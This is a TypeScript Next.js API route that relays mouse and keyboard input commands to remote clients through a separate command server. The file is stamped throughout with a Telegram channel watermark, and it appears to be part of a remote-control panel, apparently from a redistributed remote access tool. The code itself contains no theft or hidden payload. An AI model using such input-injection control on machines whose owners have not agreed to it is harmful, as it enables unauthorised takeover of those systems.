// t.me/SentinelLinks

import { NextResponse } from "next/server"

const WS_SERVER_URL = process.env.GROB_WS_SERVER_URL || "http://localhost:8765"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const clientId = body.clientId
    const inputType = body.type // "mouse" or "keyboard"
    const data = body.data

// t.me/SentinelLinks
    if (!clientId || !inputType) {
      return NextResponse.json({ error: "Missing clientId or type" }, { status: 400 })
    }

    const response = await fetch(`${WS_SERVER_URL}/command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        clientId,
        command: "input",
        data: { type: inputType, ...data },
      }),
      signal: AbortSignal.timeout(5000),
    })

    if (!response.ok) {
      const error = await response.json()
      throw new Error(error.error || "Server error")
    }

// t.me/SentinelLinks
    return NextResponse.json({ success: true })
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 })
  }
}

// t.me/SentinelLinks
//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
